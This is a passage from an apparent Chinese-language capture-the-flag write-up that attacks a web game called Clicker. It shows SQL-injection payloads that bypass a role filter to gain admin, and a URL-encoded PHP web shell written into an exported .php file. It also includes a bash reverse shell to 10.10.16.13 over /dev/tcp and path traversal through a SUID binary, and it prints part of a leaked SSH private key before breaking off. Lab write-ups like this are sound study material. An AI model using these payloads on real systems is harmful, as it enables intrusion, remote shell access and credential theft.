class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_string</span>(<span class="params"><span class="variable">$length</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$keys</span> = <span class="title function_ invoke__">array_merge</span>(<span class="title function_ invoke__">range</span>(<span class="number">0</span>, <span class="number">9</span>), <span class="title function_ invoke__">range</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;z&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$key</span> .= <span class="variable">$keys</span>[<span class="title function_ invoke__">array_rand</span>(<span class="variable">$keys</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$threshold</span> = <span class="number">1000000</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;threshold&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_POST</span>[<span class="string">&quot;threshold&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$threshold</span> = <span class="variable">$_POST</span>[<span class="string">&quot;threshold&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">get_top_players</span>(<span class="variable">$threshold</span>);</span><br><span class="line"><span class="variable">$currentplayer</span> = <span class="title function_ invoke__">get_current_player</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;PLAYER&quot;</span>]);</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&quot;extension&quot;</span>] == <span class="string">&quot;txt&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$s</span> .= <span class="string">&quot;Nickname: &quot;</span>. <span class="variable">$currentplayer</span>[<span class="string">&quot;nickname&quot;</span>] . <span class="string">&quot; Clicks: &quot;</span> . <span class="variable">$currentplayer</span>[<span class="string">&quot;clicks&quot;</span>] . <span class="string">&quot; Level: &quot;</span> . <span class="variable">$currentplayer</span>[<span class="string">&quot;level&quot;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$player</span>) &#123;</span><br><span class="line">    <span class="variable">$s</span> .= <span class="string">&quot;Nickname: &quot;</span>. <span class="variable">$player</span>[<span class="string">&quot;nickname&quot;</span>] . <span class="string">&quot; Clicks: &quot;</span> . <span class="variable">$player</span>[<span class="string">&quot;clicks&quot;</span>] . <span class="string">&quot; Level: &quot;</span> . <span class="variable">$player</span>[<span class="string">&quot;level&quot;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$_POST</span>[<span class="string">&quot;extension&quot;</span>] == <span class="string">&quot;json&quot;</span>) &#123;</span><br><span class="line">  <span class="variable">$s</span> .= <span class="title function_ invoke__">json_encode</span>(<span class="variable">$currentplayer</span>);</span><br><span class="line">  <span class="variable">$s</span> .= <span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$s</span> .= <span class="string">&#x27;&lt;table&gt;&#x27;</span>;</span><br><span class="line">  <span class="variable">$s</span> .= <span class="string">&#x27;&lt;thead&gt;&#x27;</span>;</span><br><span class="line">  <span class="variable">$s</span> .= <span class="string">&#x27;  &lt;tr&gt;&#x27;</span>;</span><br><span class="line">  <span class="variable">$s</span> .= <span class="string">&#x27;    &lt;th scope=&quot;col&quot;&gt;Nickname&lt;/th&gt;&#x27;</span>;</span><br><span class="line">  <span class="variable">$s</span> .= <span class="string">&#x27;    &lt;th scope=&quot;col&quot;&gt;Clicks&lt;/th&gt;&#x27;</span>;</span><br><span class="line">  <span class="variable">$s</span> .= <span class="string">&#x27;    &lt;th scope=&quot;col&quot;&gt;Level&lt;/th&gt;&#x27;</span>;</span><br><span class="line">  <span class="variable">$s</span> .= <span class="string">&#x27;  &lt;/tr&gt;&#x27;</span>;</span><br><span class="line">  <span class="variable">$s</span> .= <span class="string">&#x27;&lt;/thead&gt;&#x27;</span>;</span><br><span class="line">  <span class="variable">$s</span> .= <span class="string">&#x27;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">  <span class="variable">$s</span> .= <span class="string">&#x27;  &lt;tr&gt;&#x27;</span>;</span><br><span class="line">  <span class="variable">$s</span> .= <span class="string">&#x27;    &lt;th scope=&quot;row&quot;&gt;&#x27;</span> . <span class="variable">$currentplayer</span>[<span class="string">&quot;nickname&quot;</span>] . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">  <span class="variable">$s</span> .= <span class="string">&#x27;    &lt;td&gt;&#x27;</span> . <span class="variable">$currentplayer</span>[<span class="string">&quot;clicks&quot;</span>] . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">  <span class="variable">$s</span> .= <span class="string">&#x27;    &lt;td&gt;&#x27;</span> . <span class="variable">$currentplayer</span>[<span class="string">&quot;level&quot;</span>] . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">  <span class="variable">$s</span> .= <span class="string">&#x27;  &lt;/tr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$player</span>) &#123;</span><br><span class="line">    <span class="variable">$s</span> .= <span class="string">&#x27;  &lt;tr&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$s</span> .= <span class="string">&#x27;    &lt;th scope=&quot;row&quot;&gt;&#x27;</span> . <span class="variable">$player</span>[<span class="string">&quot;nickname&quot;</span>] . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$s</span> .= <span class="string">&#x27;    &lt;td&gt;&#x27;</span> . <span class="variable">$player</span>[<span class="string">&quot;clicks&quot;</span>] . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>; </span><br><span class="line">    <span class="variable">$s</span> .= <span class="string">&#x27;    &lt;td&gt;&#x27;</span> . <span class="variable">$player</span>[<span class="string">&quot;level&quot;</span>] . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$s</span> .= <span class="string">&#x27;  &lt;/tr&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$s</span> .= <span class="string">&#x27;&lt;/tbody&gt;&#x27;</span>;</span><br><span class="line">  <span class="variable">$s</span> .= <span class="string">&#x27;&lt;/table&gt;&#x27;</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;exports/top_players_&quot;</span> . <span class="title function_ invoke__">random_string</span>(<span class="number">8</span>) . <span class="string">&quot;.&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$s</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /admin.php?msg=Data has been saved in &#x27;</span> . <span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="æ¼æ´åˆ©ç”¨-updateæ³¨å…¥"><a href="#æ¼æ´åˆ©ç”¨-updateæ³¨å…¥" class="headerlink" title="æ¼æ´åˆ©ç”¨(updateæ³¨å…¥)"></a>æ¼æ´åˆ©ç”¨(updateæ³¨å…¥)</h3><h4 id="å‡çº§role"><a href="#å‡çº§role" class="headerlink" title="å‡çº§role"></a>å‡çº§role</h4><p><code>db_utils.php</code>æ–‡ä»¶ä¸­çš„<code>save_profile</code>å‡½æ•°å­˜åœ¨sqlæ³¨å…¥ï¼š<code>update</code>;</p>
<p>åˆ©ç”¨é“¾ï¼š<code>play.php ==&gt; save_game.php ==&gt; db_utils.php ==&gt;save_profile</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">save_profile</span>(<span class="params"><span class="variable">$player</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$pdo</span>;</span><br><span class="line">  	<span class="variable">$params</span> = [<span class="string">&quot;player&quot;</span>=&gt;<span class="variable">$player</span>];</span><br><span class="line">	<span class="variable">$setStr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  	<span class="keyword">foreach</span> (<span class="variable">$args</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    		<span class="variable">$setStr</span> .= <span class="variable">$key</span> . <span class="string">&quot;=&quot;</span> . <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">quote</span>(<span class="variable">$value</span>) . <span class="string">&quot;,&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">  	<span class="variable">$setStr</span> = <span class="title function_ invoke__">rtrim</span>(<span class="variable">$setStr</span>, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">  	<span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;UPDATE players SET <span class="subst">$setStr</span> WHERE username = :player&quot;</span>);</span><br><span class="line">  	<span class="variable">$stmt</span> -&gt; <span class="title function_ invoke__">execute</span>(<span class="variable">$params</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>:player</code> å ä½ç¬¦è¡¨ç¤ºä¸€ä¸ªç©å®¶çš„ç”¨æˆ·åï¼Œå®ƒå°†åœ¨æ‰§è¡ŒæŸ¥è¯¢æ—¶è¢« $params æ•°ç»„ä¸­å¯¹åº”çš„å€¼æ‰€æ›¿æ¢ã€‚è¿™ç§åšæ³•å¯ä»¥ç¡®ä¿ SQL æŸ¥è¯¢çš„å®‰å…¨æ€§;ä½†æ˜¯<code>$setStr</code>æ²¡æœ‰ä½¿ç”¨å ç”¨ç¬¦å·ï¼›å­˜åœ¨æ³¨å…¥ç‚¹;</p>
<p>å¹¶ä¸”<code>$args</code>å˜é‡æ˜¯é€šè¿‡<code>save_game.php</code>æ–‡ä»¶çš„<code>foreach($_GET as $key=&gt;$value)</code>å‡½æ•°ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥æ§åˆ¶ï¼›å³ä½¿åœ¨<code>save_game.php</code>æ–‡ä»¶å¯¹ä¸Šä¼ çš„GETå‚æ•°çš„é”®å€¼ä¸èƒ½ä¸º<code>role</code>åšäº†é™åˆ¶ï¼Œä¹Ÿå¯ä»¥è½»æ¾ç»•è¿‡ï¼›</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strtolower</span>(<span class="variable">$key</span>) === <span class="string">&#x27;role&#x27;</span>) &#123;</span><br><span class="line">   		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /index.php?err=Malicious activity detected!&#x27;</span>);</span><br><span class="line">		<span class="keyword">die</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h5 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h5><p>å°†<code>role%3d&quot;Admin&quot;%23</code>å½“ä½œé”®å€¼ç»•è¿‡æ£€æŸ¥ï¼Œå†ç”¨<code>#</code>æ³¨é‡Šåé¢çš„å†…å®¹</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> players <span class="keyword">SET</span> role<span class="operator">=</span>&quot;Admin&quot;# <span class="keyword">WHERE</span> username <span class="operator">=</span> :player</span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /save_game.php?clicks=0&amp;level=0&amp;role%3d&quot;Admin&quot;%23</span><br></pre></td></tr></table></figure>

<h5 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h5><p>åˆ©ç”¨<code>/**/</code>ç»•è¿‡<code>strtolower($key) === &#39;role&#39;</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> players <span class="keyword">SET</span> role<span class="comment">/**/</span><span class="operator">=</span>&quot;Admin&quot; <span class="keyword">WHERE</span> username <span class="operator">=</span> :player</span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /save_game.php?clicks=0&amp;level=0&amp;role%2f%2a%2a%2f=Admin</span><br></pre></td></tr></table></figure>

<h4 id="ğŸ‘†ğŸ"><a href="#ğŸ‘†ğŸ" class="headerlink" title="ğŸ‘†ğŸ"></a>ğŸ‘†ğŸ</h4><p><code>export.php</code>ä¸­å­˜åœ¨å±é™©å‡½æ•°<code>file_put_contents($filename, $s);</code>,å…ˆæ¥çœ‹çœ‹<code>$filename</code>æ˜¯æ€ä¹ˆæ¥çš„ï¼Œå¦‚ä¸‹ï¼š</p>
<p>â€œexports&#x2F;top_players_â€åŠ ä¸Š8ä¸ªéšæœºå­—ç¬¦ï¼Œå˜é‡åä¸º<code>extension</code>çš„postä¼ å‚(è¿™é‡Œæ²¡æœ‰å¯¹åç¼€åšæ£€æŸ¥ï¼Œå¯ä»¥ä¿®æ”¹åç¼€ä¸ºphpç­‰)ï¼›æ‰€ä»¥æ–‡ä»¶åç¼€æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;exports/top_players_&quot;</span> . <span class="title function_ invoke__">random_string</span>(<span class="number">8</span>) . <span class="string">&quot;.&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&quot;extension&quot;</span>];</span><br></pre></td></tr></table></figure>

<p>å†æ¥çœ‹çœ‹<code>$s</code>å˜é‡æ˜¯æ€ä¹ˆæ¥çš„ï¼›å½“åç¼€ä¸æ˜¯<code>txt,json</code>æ—¶ </p>
<p>å…¶ä¸­<code>$currentplayer[&quot;nickname&quot;]</code>,<code>$currentplayer[&quot;clicks&quot;] </code>,<code>$currentplayer[&quot;level&quot;]</code>;ä¸‰ä¸ªå˜é‡æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼›</p>
<p>è€Œ<code>$currentplayer[&quot;clicks&quot;] </code>,<code>$currentplayer[&quot;level&quot;]</code>çš„æ•°æ®ç±»å‹æ˜¯æ•°å­—ï¼Œæ‰€ä»¥åªèƒ½åœ¨<code>nickname</code>åŠ¨æ‰‹ï¼›</p>
<p><code>&quot;nickname&quot;</code>çš„å€¼ä¹Ÿå¯ä»¥é€šè¿‡<code>update</code>æ³¨å…¥æ¥æ”¹å˜ï¼›</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /save_game.php?clicks=1000001&amp;level=0&amp;nickname=%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%73%68%65%6c%6c%27%5d%29%3b%3f%3e </span><br></pre></td></tr></table></figure>

<p>åœ¨æŠ“åŒ…å°†åç¼€æ”¹ä¸ºphp;<code>extension=php</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/%E8%81%94%E6%83%B3%E6%88%AA%E5%9B%BE_20231214130809.png"></p>
<p>åå¼¹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST:shell=system(&#x27;%2Fbin%2Fbash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.13%2F5555%200%3E%261%22&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="user-www-data"><a href="#user-www-data" class="headerlink" title="user_www-data"></a>user_www-data</h3><p>æ€è·¯åº”è¯¥å…ˆå»æ•°æ®åº“é‡Œæ‰¾æ•æ„Ÿä¿¡æ¯ï¼Œæ‰¾ä¸åˆ°å†æœé›†åˆ«çš„æ•æ„Ÿä¿¡æ¯ï¼›</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/opt/manage/execute_query</span><br></pre></td></tr></table></figure>

<p>å°†jackç”¨æˆ·çš„suidæ–‡ä»¶ï¼š<code>/opt/manage/execute_query</code>ä¸‹è½½åˆ°æœ¬åœ°æŸ¥çœ‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">main()&#123;</span><br><span class="line"><span class="keyword">if</span> ( argc &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    dest = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">0x14</span>uLL, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ERROR: Invalid arguments&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">strncpy</span>(dest, <span class="string">&quot;create.sql&quot;</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">strncpy</span>(dest, <span class="string">&quot;populate.sql&quot;</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">strncpy</span>(dest, <span class="string">&quot;reset_password.sql&quot;</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">strncpy</span>(dest, <span class="string">&quot;clean.sql&quot;</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">strncpy</span>(dest, argv[<span class="number">2</span>], <span class="number">0x14</span>uLL);</span><br><span class="line">LABEL_10:</span><br><span class="line">        <span class="built_in">strcpy</span>(s, <span class="string">&quot;/home/jack/queries/&quot;</span>);</span><br><span class="line">        v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">        v5 = <span class="built_in">strlen</span>(dest);</span><br><span class="line">        name = (<span class="type">char</span> *)<span class="built_in">calloc</span>(v4 + v5 + <span class="number">1</span>, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(name, s);</span><br><span class="line">        <span class="built_in">strcat</span>(name, dest);</span><br><span class="line">        setreuid(<span class="number">0x3E8</span>u, <span class="number">0x3E8</span>u);</span><br><span class="line">        <span class="keyword">if</span> ( access(name, <span class="number">4</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;File not readable or not found&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">strcpy</span>(src, <span class="string">&quot;/usr/bin/mysql -u clicker_db_user --password=&#x27;clicker_db_password&#x27; clicker -v &lt; &quot;</span>);</span><br><span class="line">          v6 = <span class="built_in">strlen</span>(src);</span><br><span class="line">          v7 = <span class="built_in">strlen</span>(dest);</span><br><span class="line">          command = (<span class="type">char</span> *)<span class="built_in">calloc</span>(v6 + v7 + <span class="number">1</span>, <span class="number">1uLL</span>);</span><br><span class="line">          <span class="built_in">strcat</span>(command, src);</span><br><span class="line">          <span class="built_in">strcat</span>(command, name);</span><br><span class="line">          system(command);</span><br><span class="line">        &#125;</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ERROR: not enough arguments&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>bin<span class="operator">/</span>mysql <span class="operator">-</span>u clicker_db_user <span class="comment">--password=&#x27;clicker_db_password&#x27; clicker -v &lt; clean.sql</span></span><br><span class="line">#<span class="operator">&lt;</span> clean.sql è¡¨ç¤ºä»åä¸º clean.sql çš„æ–‡ä»¶ä¸­è¯»å– <span class="keyword">SQL</span> å‘½ä»¤ï¼Œå¹¶å°†å…¶å‘é€åˆ° MySQL æœåŠ¡å™¨ä»¥æ‰§è¡Œ</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰æ„æ€çš„æ˜¯å³ä½¿ä¸æ˜¯sqlæ–‡ä»¶ä¹Ÿå¯ä»¥è¯»å–ï¼›</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1$ /opt/manage/execute_query 5 ../.ssh/id_rsa</span><br><span class="line">mysql: [Warning] Using a password on the <span class="built_in">command</span> line interface can be insecure.</span><br><span class="line">--------------</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY---</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAs4eQaWHe45iGSieDHbraAYgQdMwlMGPt50KmMUAvWgAV2zlP8/1Y</span><br><span class="line">J/tSzgoR9Fko8I1UpLnHCLz2Ezsb/MrLCe8nG5TlbJrrQ4HcqnS4TKN7DZ7XW0bup3ayy1</span><br><span class="line">kAAZ9Uot6ep/ekM8E+7/39VZ5fe1FwZj4iRKI+g/BVQFclsgK02B594GkOz33P/Zzte2jV</span><br><span class="line">Tgmy3+htPE5My31i2lXh6XWfepiBOjG+mQDg2OySAphbO1SbMisowP1aSexKMh7Ir6IlPu</span><br><span class="line">nuw3l/luyvRGDN8fyumTeIXVAdPfOqMqTOVECo7hAoY+uYWKfiHxOX4fo+/fNwdcfctBUm</span><br><span class="line">pr5Nxx0GCH1wLnHsbx+/oBkPzxuzd+BcGNZp7FP8cn+dEFz2ty8Ls0Mr+XW5ofivEwr3+e</span><br><span class="line">30OgtpL6QhO2eLiZVrIXOHiPzW49emv4xhuoPF3E/5CA6akeQbbGAppTi+EBG9Lhr04c9E</span><br><span class="line">2uCSLPiZqHiViArcUbbXxWMX2NPSJzDsQ4xeYqFtAAAFiO2Fee3thXntAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBALOHkGlh3uOYhkongx262gGIEHTMJTBj7edCpjFAL1oAFds5T/P9WCf7Us4KEfRZ</span><br><span class="line">KPCNVKS5xwi89hM7G/zKywnvJxuU5Wya60OB3Kp0uEyjew2e11tG7qd2sstZAAGfVKLenq</span><br><span class="line">f3pDPBPu/9/VWeX3tRcGY+IkSiPoPwVUBXJbICtNgefeBpDs99z/2c7Xto1U4Jst/obTxO</span><br><span class="line">TMt9YtpV4el1n3qYgToxvpkA4NjskgKYWztUmzIrKMD9WknsSjIeyK+iJT7p7sN5f5bsr0</span><br><span class="line">RgzfH8rpk3iF1QHT3zqjKkzlRAqO4QKGPrmFin4h8Tl+H6Pv3zcHXH3LQVJqa+TccdBgh9</span><br><span class="line">cC5x7G8fv6AZD88bs3fgXBjWaexT/HJ/nRBc9rcvC7NDK/l1uaH4rxMK9/nt9DoLaS+kIT</span><br><span class="line">tni4mVayFzh4j81uPXpr+MYbqDxdxP+QgOmpHkG2xgKaU4vhARvS4a9OHPRNrgkiz4mah4</span><br><span class="line">lYgK3FG218VjF9jT0icw7EOMXmKhbQAAAAMBAAEAAAGACLYPP83L7uc7vOVl609hvKlJgy</span><br><span class="line">FUvKBcrtgBEGq44XkXlmeVhZVJbcc4IV9Dt8OLxQBWlxecnMPufMhld0Kvz2+XSjNTXo21</span><br><span class="line">1LS8bFj1iGJ2WhbXBErQ0bdkvZE3+twsUyrSL/xIL2q1DxgX7sucfnNZLNze9M2akvRabq</span><br><span class="line">DL53NSKxpvqS/v1AmaygePTmmrz/mQgGTayA5Uk5sl7Mo2CAn5Dw3PV2+KfAoa3uu7ufyC</span><br><span class="line">kMJuNWT6uUKR2vxoLT5pEZKlg8Qmw2HHZxa6wUlpTSRMgO+R+xEQsemUFy0vCh4TyezD3i</span><br><span class="line">SlyE8yMm8gdIgYJB+FP5m4eUyGTjTE4+lhXOKgEGPcw9+MK7Li05Kbgsv/ZwuLiI8UNAhc</span><br><span class="line">9vgmEfs/hoiZPX6fpG+u4L82oKJuIbxF/I2Q2YBNIP9O9qVLdxUniEUCNl3BOAk/8H6usN</span><br><span class="line">9pLG5kIalMYSl6lMnfethUiUrTZzATPYT1xZzQCdJ+qagLrl7O33aez3B/OAUrYmsBAAAA</span><br><span class="line">wQDB7xyKB85+On0U9Qk1jS85dNaEeSBGb7Yp4e/oQGiHquN/xBgaZzYTEO7WQtrfmZMM4s</span><br><span class="line">SXT5qO0J8TBwjmkuzit3/BjrdOAs8n2Lq8J0sPcltsMnoJuZ3Svqclqi8WuttSgKPyhC4s</span><br><span class="line">FQsp6ggRGCP64C8N854//KuxhTh5UXHmD7+teKGdbi9MjfDygwk+gQ33YIr2KczVgdltwW</span><br><span 